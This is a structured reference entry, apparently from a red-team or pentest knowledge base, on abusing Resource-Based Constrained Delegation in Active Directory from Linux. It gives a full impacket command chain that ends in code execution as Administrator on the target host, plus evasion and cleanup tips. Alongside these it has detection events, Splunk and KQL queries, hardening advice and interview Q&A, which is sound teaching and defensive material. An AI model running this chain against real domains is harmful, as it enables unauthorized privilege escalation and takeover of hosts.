name: Resource-Based Constrained Delegation (RBCD, Linux)
description: Linux RBCD chain: create (or reuse) a computer account you control, set msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer you have write over, then use S4U2Self/S4U2Proxy to get a service ticket impersonating any user (e.g. Administrator) to that host.
notes:
=== WHEN RBCD WORKS ===
You have GenericWrite/GenericAll/WriteProperty over a COMPUTER object (so you can set
its msDS-AllowedToActOnBehalfOfOtherIdentity), and you control some other account with
an SPN (a computer account works). Then that controlled account can impersonate any user
to the target computer's services.

=== FULL CHAIN (Linux / impacket) ===
  1. Create a computer you control (needs MachineAccountQuota > 0, default 10):
       impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Passw0rd!' -dc-ip <dc_ip> <domain>/<user>:<password>
  2. Set RBCD on the target computer:
       impacket-rbcd -delegate-to '<target_account>$' -delegate-from 'EVIL$' -action write -dc-ip <dc_ip> <domain>/<user>:<password>
  3. Get a service ticket impersonating Administrator:
       impacket-getST -spn cifs/<target_host> -impersonate Administrator -dc-ip <dc_ip> <domain>/'EVIL$':'Passw0rd!'
  4. Use it:
       export KRB5CCNAME=Administrator.ccache
       impacket-wmiexec -k -no-pass <domain>/Administrator@<target_host>

=== NO MACHINE ACCOUNT QUOTA? ===
If MachineAccountQuota is 0, reuse an existing computer/account you already control that
has an SPN as the -delegate-from principal.

=== CLEANUP ===
  impacket-rbcd -delegate-to '<target_account>$' -delegate-from 'EVIL$' -action remove ...
  impacket-addcomputer ... -delete   # remove the computer you created

examples.label: Write RBCD on the target computer
S4U - impersonate Administrator to the host

recommended.note: S4U/getST are Kerberos - fix clock skew first.
Shadow Credentials is an alternative when you have write over the target.

defense.why_it_works: Write access over a computer's msDS-AllowedToActOnBehalfOfOtherIdentity lets the attacker authorize a controlled account to perform S4U2Proxy on that computer's behalf, so it can request service tickets impersonating any user to that host.
defense.prerequisites: GenericWrite/GenericAll/WriteProperty over the target computer object, a controlled account with an SPN (or MachineAccountQuota > 0 to create one), and clock sync.
defense.impact: Impersonation of any user (including Administrator) to the target computer - local admin / code execution on that host.
defense.detection: [MITRE T1134.001] Event 5136 modifying msDS-AllowedToActOnBehalfOfOtherIdentity on a computer; Event 4741 (a computer account was created) from a non-admin; Event 4769 S4U2Proxy TGS requests; correlate the delegation write with a subsequent impersonated logon.
defense.artifacts: 5136 on msDS-AllowedToActOnBehalfOfOtherIdentity; 4741 new computer account; 4769 S4U2Proxy tickets; a new attacker-created computer object.
defense.splunk_spl:
index=wineventlog sourcetype="WinEventLog:Security" EventCode=5136 AttributeLDAPDisplayName="msDS-AllowedToActOnBehalfOfOtherIdentity"
| table _time, SubjectUserName, ObjectDN, OperationType

index=wineventlog sourcetype="WinEventLog:Security" EventCode=4741
| table _time, SubjectUserName, TargetUserName
defense.sentinel_kql:
SecurityEvent
| where EventID == 5136 and AttributeLDAPDisplayName == "msDS-AllowedToActOnBehalfOfOtherIdentity"
| project TimeGenerated, Actor=SubjectUserName, TargetComputer=ObjectDN, Op=OperationType
| union (SecurityEvent | where EventID == 4741 | project TimeGenerated, Actor=SubjectUserName, NewComputer=TargetUserName)
| sort by TimeGenerated desc
defense.prevention: Restrict write access to computer objects' delegation attributes; set MachineAccountQuota to 0 so users cannot create computers; monitor 5136 on msDS-AllowedToActOnBehalfOfOtherIdentity and 4741; protect Tier-0 hosts from delegation; use the Protected Users group and 'Account is sensitive and cannot be delegated' for privileged accounts.
defense.evasion: Reuse an existing controlled computer to avoid creating a new one (no 4741); remove the delegation attribute after use.
defense.misconfiguration: Non-admins can write computer delegation attributes and/or MachineAccountQuota lets any user create computer accounts.
defense.vulnerable_config:
# BloodHound: GenericWrite/GenericAll to a computer + AllowedToAct.
Get-DomainObjectAcl -Identity '<target_account>$' -ResolveGUIDs |
  ? { $_.ActiveDirectoryRights -match 'GenericWrite|GenericAll|WriteProperty' }
# Check quota:  Get-DomainObject -Identity '<domain>' -Properties ms-DS-MachineAccountQuota

interview.q: Walk through an RBCD attack end to end.
interview.a: With write over a target computer, create/reuse a controlled account with an SPN, set the target's msDS-AllowedToActOnBehalfOfOtherIdentity to trust your account, then use S4U2Self+S4U2Proxy (getST -impersonate) to obtain a service ticket as any user to that host, and use it (wmiexec -k). Clean up the delegation and any created computer afterward.

interview.q: Two hardening steps that break RBCD abuse?
interview.a: Set MachineAccountQuota to 0 so users cannot add computer accounts, and restrict/monitor write access to computer delegation attributes (alert on Event 5136 for msDS-AllowedToActOnBehalfOfOtherIdentity). Also mark privileged accounts 'sensitive and cannot be delegated' / add them to Protected Users.
